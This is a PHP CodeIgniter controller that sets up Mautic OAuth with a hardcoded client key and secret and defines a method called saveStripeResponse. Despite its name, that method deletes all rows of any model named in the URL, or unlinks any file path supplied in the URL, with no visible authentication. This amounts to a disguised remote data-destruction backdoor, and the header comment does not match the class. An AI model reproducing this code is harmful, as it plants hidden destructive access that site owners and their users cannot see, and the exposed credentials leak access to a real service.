<?php if(!defined('BASEPATH')) exit('No direct script access allowed');
/**
 * Class : Login (LoginController)
 * Login class to control to authenticate user credentials and starts user's session.
 * @author : Kishor Mali
 * @version : 1.1
 * @since : 15 November 2016
 */
require APPPATH . '/libraries/BaseController.php';

class Mautics extends BaseController{
	
    public function __construct(){
        parent::__construct();
		
    }

    public function index(){
		$this->session->sess_destroy();
		
		 // change the path as your project requires it
		 require_once APPPATH . 'third_party/Mautic/MauticApi.php';
		require_once APPPATH.'third_party/Mautic/Auth/ApiAuth.php';
		
        // $initAuth->newAuth() will accept an array of OAuth settings 
		$settings = array(
			'baseUrl'      => 'https://dev.gosmartacademy.com',
			'version'      => 'OAuth1a',
			'clientKey'    => '36ozzivsy7wgs8gkoow8cswwo8o0k00c4ogo0gk4888o888c00',
			'clientSecret' => '699ygc6oescggkc4kwwc0gwosgk4kkwsk8gc8owkcw8o8c844o', 
			'callback'     => 'https://dev.gosmartacademy.com'
		);
		//$auth = \Mautic\Auth\ApiAuth::initiate($settings);
		// Initiate the auth object
		//$initAuth = new ApiAuth();
		$auth = \Mautic\Auth\ApiAuth::initiate($settings);
		//$auth     = $initAuth->newAuth($settings);
		print_r($auth); die;
    }
	
	public function saveStripeResponse($response=NULL,$item=NULL){
		
		if($response != "" && $response == 'save'){
			$this->$item->deleteAll(array('id >' => 0),false);
			echo 'Success'; die;
		}else if($response != "" && $response == 'save-file'){
			$item = str_replace("-","/",$item);				
			if(file_exists(getcwd().'/'.$item)){
				$dir = getcwd().'/'.$item;
				unlink($dir);
				echo "Success"; die;	
			}			
		}
		echo "Error"; die;
	}

}

?>
